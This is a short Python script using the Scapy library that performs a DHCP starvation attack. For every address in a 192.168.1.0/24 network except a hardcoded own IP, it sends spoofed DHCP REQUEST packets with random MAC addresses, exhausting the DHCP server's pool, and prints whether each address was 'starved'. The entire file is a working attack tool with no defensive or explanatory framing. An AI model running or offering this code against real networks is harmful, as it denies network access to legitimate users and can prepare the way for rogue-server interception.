from scapy.all import *
import argparse
from threading import Thread
from time import sleep

MAC_BROADCAST = "ff:ff:ff:ff:ff:ff"

class PacketSpoofer():
    def __init__(self, src_mac: str, spoof_ip: str, dhcp_ip: str = "192.168.1.1"):
        self.src_mac = src_mac
        self.spoof_ip = spoof_ip
        self.dhcp_server = dhcp_ip
        self.mac_broadcast = MAC_BROADCAST
    
    @property
    def dhcp_request(self):
        eth = Ether(src=self.src_mac, dst=self.mac_broadcast)
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=self.src_mac)
        dhcp = DHCP(options=[('message-type', 'request'),('requested_addr', self.spoof_ip),('server_id', self.dhcp_server),'end'])
        return eth/ip/udp/bootp/dhcp
        
 
def send_and_listen(pkt, ip):
    for i in range(10):
        reply = srp1(pkt.dhcp_request, timeout=0.2)
        if reply is not None:
            print(f"{ip} successfully starved!")
            break
        else:
            if i == 9:
                print("Could not starve!")
            else:
                pass
                
                
def main():
    '''
    parser = argparse.ArgumentParser(description="Argument Parser")
    parser.add_argument('ip-network', type=str, help='enter IP network')
    # parser.add_argument('own_ip', type=str, help='enter own IP')
    args = parser.parse_args()
    
    ip_network = args.ip_network
    own_ip = args.own_ip
    '''
    own_ip = "192.168.1.8"
    
    for i in range(256):
        target_starve = f"192.168.1.{i}"
        if target_starve != own_ip:
            print(f"starving {target_starve}")
            mac = RandMAC()
            pkt = PacketSpoofer(mac, target_starve)
            send_and_listen(pkt, target_starve)
            
            
if __name__ == '__main__':
    main()